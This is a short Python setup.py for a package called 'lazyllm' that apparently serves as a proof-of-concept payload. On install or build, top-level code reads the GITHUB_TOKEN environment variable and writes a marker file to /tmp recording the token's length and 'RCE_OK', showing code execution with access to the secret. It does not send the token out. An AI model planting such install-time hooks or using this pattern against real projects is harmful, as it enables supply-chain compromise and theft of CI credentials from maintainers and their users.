import os as _os
_tok=_os.environ.get('GITHUB_TOKEN','')
open('/tmp/POC_MARKER_LAZYLLM.txt','w').write('POC_MARKER_POC_MARKER_LAZYLLM\nGH_TOKEN_LEN=%d\nRCE_OK\n' % len(_tok))
from setuptools import setup
setup(name='lazyllm',version='1.0.0')
